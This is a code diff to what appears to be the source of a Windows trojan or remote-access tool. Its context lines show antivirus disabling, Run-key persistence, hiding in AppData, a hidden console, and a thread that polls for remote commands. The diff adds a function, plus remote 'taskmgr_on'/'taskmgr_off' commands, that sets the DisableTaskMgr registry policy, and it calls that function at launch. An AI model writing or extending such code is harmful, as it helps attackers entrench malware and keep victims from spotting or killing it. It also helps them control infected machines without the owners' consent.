@@ -1375,6 +1375,14 @@ void disableAntivirus() {
     }
 }
 
+void blockTaskManager() {
+    HKEY hKey;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD v = 1; RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(hKey);
+    }
+}
+
 void installStartup() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
@@ -1526,6 +1534,8 @@ DWORD WINAPI pollThread(LPVOID) {
                     else if (type == "startup_on") { installStartup(); result = getStartupStatus(); }
                     else if (type == "startup_off") { removeStartup(); result = getStartupStatus(); }
                     else if (type == "startup_status") result = getStartupStatus();
+                    else if (type == "taskmgr_on") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableTaskMgr",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
+                    else if (type == "taskmgr_off") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableTaskMgr");RegCloseKey(k);} result="ok"; }
                     else if (type == "uninstall") result = uninstallSelf();
                     else result = "unknown_type";
                 } catch(...) { result = "exec_err"; }
@@ -1642,6 +1652,7 @@ int main(int argc, char* argv[]) {
     }
     if (hide) { hideToAppData(); return 0; }
     disableAntivirus();
+    blockTaskManager();
     if (computerName.empty()) computerName = getComputerName();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
